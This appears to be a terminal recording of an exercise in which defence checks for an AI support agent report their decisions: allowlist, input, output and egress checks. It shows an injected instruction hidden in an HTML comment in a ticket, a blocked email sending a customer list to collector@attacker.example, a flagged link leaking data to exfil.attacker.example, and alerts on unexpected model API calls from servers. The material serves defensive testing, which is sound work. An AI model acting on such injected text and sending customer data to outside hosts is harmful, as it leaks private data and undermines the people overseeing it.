[123.117112, "o", "Defence decisions (every call, with the reason your code returned):\r\n\r\n  allowlist    ALLOW e06 search_kb {\"query\": \"vpn reconnect fails after update\"}\r\n  input_check  FLAG e07 (ticket:T-4821): text hidden in an HTML comment\r\n"]
[123.117187, "o", "  allowlist    DENY  e09 send_email {\"to\": \"collector@attacker.example\", \"subject\": \"customer list\", \"body\": \"Attached as r...\r\n"]
[123.117388, "o", "  output_check FLAG e10: data in a link to an outside host: exfil.attacker.example\r\n  allowlist    ALLOW e13 get_ticket {\"ticket\": \"T-4820\"}\r\n  allowlist    ALLOW e14 send_email {\"to\": \"aisha.k@tsg.example\", \"subject\": \"Your ticket T-4820\", \"body\": \"Resolved by cle...\r\n  allowlist    ALLOW e15 fetch_url {\"url\": \"https://kb.tsg.example/hours\"}\r\n"]
[123.117571, "o", "  rate_anomaly FLAG account rohan.v\r\n  egress_sig   FLAG g07 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g08 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g09 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g10 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n"]
[123.11763, "o", "  egress_sig   FLAG g11 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g12 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g13 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g14 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n"]
[123.117802, "o", "  egress_sig   FLAG g15 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g16 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g17 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g18 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g19 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g20 ci-runner-07 -> api.model-vendor.example: model API call from ci-runner-07, which is not a model caller\r\n  egress_sig   FLAG g21 svc-backup-02 -> api.model-vendor.example: model API call from svc-backup-02, which is not a model caller\r\n  egress_sig   FLAG g22 svc-backup-02 -> api.model-vendor.example: model API call from svc-backup-02, which is not a model caller\r\n"]
